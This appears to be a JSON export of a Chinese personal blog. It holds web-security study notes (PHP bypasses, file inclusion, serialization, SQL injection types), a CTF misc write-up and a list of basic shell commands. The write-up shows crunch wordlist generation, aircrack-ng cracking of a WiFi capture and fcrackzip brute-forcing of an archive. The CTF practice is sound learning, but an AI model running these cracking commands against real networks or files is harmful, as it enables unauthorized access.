Extract变量覆盖Php弱类型比较二次url编码绕过哈希绕过正则绕过 第三节 文件上传 文件包含 本地js检验黑名单检验白名单内容检验竞争上传 本地包含远程文件 包含相关函数：Include（）Include_once（）require()Rquire_once() 第四节 序列化和反序列化 在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。序列化函数原型如下：string serialize ( mixed $value )对象的序列化主要有两种用途：1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；2） 在网络上传送对象的字节序列。在很多应用中，需要对某些对象进行序列化，让它们离开内存空间，入住物理硬盘，以便长期保存。比如最常见的是Web服务器中的Session对象，当有 10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些seesion先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。当两个进程在进行远程通信时，彼此可以发送各种类型的数据。无论是何种类型的数据，都会以二进制序列的形式在网络上传送。发送方需要把这个Java对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为Java对象。https://www.cnblogs.com/youyoui/p/8610068.html 魔术方法参考网站：https://php.net/manual/zh/language.oop5.magic.phpconstruct(), __destruct(), __call(), __callStatic(), __get(), __set(), __isset(), __unset(),__sleep(), __wakeup(), __toString(), __invoke(), __set_state(), __clone()和debuginfo()等方法在 PHP 中被称为魔术方法（Magic methods）。在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。 CautionPHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。 第五节 sql注入 宽字节注入约束条件注入基于时间盲注","categories":[],"tags":[]},{"title":"test","slug":"test","date":"2019-06-14T16:41:45.000Z","updated":"2019-08-06T10:01:25.814Z","comments":true,"path":"2019/06/15/test/","link":"","permalink":"http://yoursite.com/2019/06/15/test/","excerpt":"","text":"哈哈","categories":[],"tags":[]},{"title":"ctf杂项中 想蹭网先解开密码、隐写2两道writeup","slug":"杂项两道writeup","date":"2019-06-14T09:16:27.000Z","updated":"2019-08-06T11:15:08.844Z","comments":true,"path":"2019/06/14/杂项两道writeup/","link":"","permalink":"http://yoursite.com/2019/06/14/杂项两道writeup/","excerpt":"","text":"##想蹭网先解开密码根据提示，我们只要猜出正确的手机号就能拿到flag并且我们已经知道手机号前七位，只需要猜到后四位使用kali Linux中的工具 crunch 生成密码字典制作1391040开头的11位手机号密码字典 crunch 11 11 0123456789 -t 1391040%%%% -o num11.txt两个11 分别是密码的最小长度和最大长度 num11.txt 是生成的字典名称 利用aircrack-ng破解密码aircrack-ng -w num11.txt wifi.cap 这里num11.txt是爆破用到的密码字典 ##隐写首先用kali中的binwalk分析这个图片，发现有一个rar文件 11 然后用foremost分离，得到一个output文件夹 接着打开路径 output/zip解压里边的zip压缩包，得到如图两个文件 然后再次解压里边的flag.rar，却发现需要密码然后回头看一下另一个，是个图片根据提示的图片，知道密码是三个数字三位的数字密码，继续用crunch生成字典 crunch 3 3 0123456789 -o 3number.txt 之后用kali 自带的fcrackzip工具解密，得到解密密码871。fcrack -D -p 3number.txt -u flag.rar -v-D 就是用的字典模式 -p指定起始破解密码 -u这个参数是为了显示密码用 -v是展示更多信息 输入密码，发现压缩包里还是一张图片 用HXD打开这张图片，在最下边找到信息f1@g{eTB1IEFyZSBhIGhAY2tlciE=} 发现中括号里边的是用base64加密的，然后用ascll及进制转换这个工具，得到y0u Are a h@cker!最后得到flag，f1@g{ y0u Are a h@cker!}","categories":[],"tags":[]},{"title":"最近常用命令行命令","slug":"我的第一篇博客文章","date":"2019-06-08T13:24:29.000Z","updated":"2019-07-19T07:39:49.162Z","comments":true,"path":"2019/06/08/我的第一篇博客文章/","link":"","permalink":"http://yoursite.com/2019/06/08/我的第一篇博客文章/","excerpt":"","text":"##Windows下的命令cd..或者cd .. 返回文件上一层目录cd/ 退回根目录cd ../.. 返回文件上两回目录cd d: 切换到D盘cd / 跳转到根目录cd path 跳转到指定目录cls 清除当前屏幕显示dir 显示当前目录中的子文件夹与文件exit 退出dos命令行 md 创建目录例：md movie 在当前目录中创建名为movie的文件夹例：md d:\\test\\movie 创建d:\\test\\movie目录 rd 删除目录例：rd movie // 删除当前目录下的movie空文件夹例：rd /s /q d:\\test // 使用安静模式删除d:\\test（除目录本身外，还将删除指定目录下的所有子目录和文件） move 移动目录 move 1.png d:\\test\\2.png // 将当前目录下的1.png移动到d盘test文件夹中，并重命名为2.png （若test中也存在同名的png图片，会询问是否覆盖） ##Linux下的命令 tar zxvf 文件名 解压tar.gz 类型文件 unrar e all.rar 解压一个名为all的rar型文件rar a a.png a.rar 将一个名为a的图片压缩为一个名为a的rar文件pwd 查看当前所处目录路径mkdir 文件名 创建一个文件ls 显示当前目录中的子文件夹与文件","categories":[],"tags":[]}]}